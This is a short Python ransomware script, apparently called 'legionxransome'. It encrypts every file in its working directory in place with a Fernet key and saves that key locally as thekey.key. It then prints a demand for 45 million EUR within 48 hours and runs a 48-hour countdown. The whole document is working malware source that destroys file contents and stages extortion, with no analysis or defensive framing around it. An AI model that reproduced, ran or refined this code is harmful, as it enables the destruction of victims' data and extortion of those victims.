#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
import time
import datetime
import subprocess

#finding the files within the system

files = []

for file in os.listdir():
	if file == "legion.py" or file == "thekey.key" or file == ".xsoul.py":
		continue
	if os.path.isfile(file):
		files.append(file)



#generating a key with use of Fernet function

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents  = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)



print("Welcome to legionxransome, your files are in our safe hands!! Send us 45 Million EUR within 48 hours, we'll send you the decrypter file as soon as we confirm the payment, or forget your files forever")


#timer

end_time = datetime.datetime.now() + datetime.timedelta(hours=48)  

while datetime.datetime.now() < end_time:

    time_left = end_time - datetime.datetime.now()
    
    hours = time_left.seconds // 3600  
    minutes = (time_left.seconds // 60) % 60
    seconds = time_left.seconds % 60

    print(f"{time_left.days} days, {hours} hours, {minutes} minutes and {seconds} seconds left")

    time.sleep(30) #every thrity seconds


subprocess.Popen(["xterm"])
